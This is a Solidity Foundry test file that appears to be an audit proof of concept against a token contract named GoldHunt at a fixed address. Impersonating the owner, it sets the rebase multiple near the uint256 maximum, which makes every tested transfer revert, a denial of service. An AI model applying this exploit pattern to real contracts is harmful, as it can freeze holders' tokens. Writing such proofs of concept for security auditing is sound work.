// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GoldHunt {
    function owner() external view returns (address);
    function rebaseMultiple() external view returns (uint);
    function rebase(uint multiple) external;
    function setRewardsPool(address _rewardsPool) external;
    function transfer(address to, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner and set up preconditions
        address owner = GoldHunt(TARGET).owner();
        vm.startPrank(owner);

        // Set rewardsPool (required precondition)
        GoldHunt(TARGET).setRewardsPool(address(0x123));

        // Stop impersonation for now
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate owner
        address owner = GoldHunt(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Get current rebaseMultiple
        uint currentMultiple = GoldHunt(TARGET).rebaseMultiple();
        console.log("Current rebaseMultiple:", currentMultiple);

        // Step 3: Calculate the maximum safe multiple that won't overflow
        // type(uint256).max / currentMultiple gives us the largest multiple
        // where currentMultiple * multiple <= type(uint256).max
        uint maxSafeMultiple = type(uint256).max / currentMultiple;
        console.log("Max safe multiple:", maxSafeMultiple);

        // Step 4: Call rebase with this large (but safe) multiple
        GoldHunt(TARGET).rebase(maxSafeMultiple);

        // Step 5: Get new rebaseMultiple
        uint newMultiple = GoldHunt(TARGET).rebaseMultiple();
        console.log("New rebaseMultiple:", newMultiple);
        assertGt(newMultiple, 1, "rebaseMultiple should be > 1 after attack");

        // Step 6: Verify newMultiple is close to type(uint256).max
        assertGt(newMultiple, type(uint256).max / 2, "rebaseMultiple should be very large");

        // Step 7: Demonstrate the DoS - try to transfer tokens (should revert due to overflow)
        // Owner has tokens from initial mint
        address tokenHolder = owner;
        vm.stopPrank(); // Stop being owner

        // Try to transfer 1 token - should revert due to overflow in amount * rebaseMultiple
        vm.startPrank(tokenHolder);
        bool transferSuccess = false;
        try GoldHunt(TARGET).transfer(address(0x456), 1) {
            transferSuccess = true;
        } catch {
            transferSuccess = false;
        }
        assertFalse(transferSuccess, "Transfer should revert when rebaseMultiple is huge");
        vm.stopPrank();

        // Also test with a larger amount to be sure
        vm.startPrank(tokenHolder);
        transferSuccess = false;
        try GoldHunt(TARGET).transfer(address(0x456), 1000) {
            transferSuccess = true;
        } catch {
            transferSuccess = false;
        }
        assertFalse(transferSuccess, "Transfer of 1000 tokens should also revert");
        vm.stopPrank();
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
